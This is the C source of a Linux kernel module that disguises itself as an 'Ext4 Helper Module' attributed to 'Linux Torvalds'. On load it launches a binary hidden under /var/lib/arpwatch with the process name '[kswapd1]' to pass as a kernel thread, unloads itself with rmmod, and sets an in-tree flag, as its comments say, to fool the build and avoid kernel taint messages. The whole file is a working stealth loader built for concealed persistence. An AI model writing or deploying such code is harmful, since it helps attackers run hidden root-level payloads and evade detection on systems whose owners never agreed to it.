#include <linux/module.h>
#include <linux/init.h>
#include <linux/kmod.h>
#include <linux/kernel.h>
#define DRIVER_AUTHOR "Linux Torvalds"
#define DRIVER_DESC "Ext4 Helper Module"

static int load_unload(void);

static int __init ext4helper_init(void)
{
    return load_unload();
}

static void __exit ext4helper_exit(void)
{
}

// starts a process within user-land that has a parent pid of kthread
// removes itself once completed and avoids tainting the kernel
static int load_unload(void)
{
    char *argv[] = {"[kswapd1]", NULL, NULL };
    static char *envp[] = {
        "HOME=/tmp",
        "TERM=linux"
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
    char *argvv[] = { "/bin/sh", "-c", "/sbin/rmmod ext4-helper", NULL };

    call_usermodehelper("/var/lib/arpwatch/arpwatch",argv,envp, UMH_WAIT_EXEC);
    // unload kernel module 
    call_usermodehelper(argvv[0], argvv, envp, UMH_WAIT_EXEC);
    return 0;
}


module_init(ext4helper_init);
module_exit(ext4helper_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR(DRIVER_AUTHOR);
MODULE_DESCRIPTION(DRIVER_DESC);
// fool kernel module build process into treating this module as "in tree"
// avoids the tainted module kernel message
MODULE_INFO(intree,"Y");
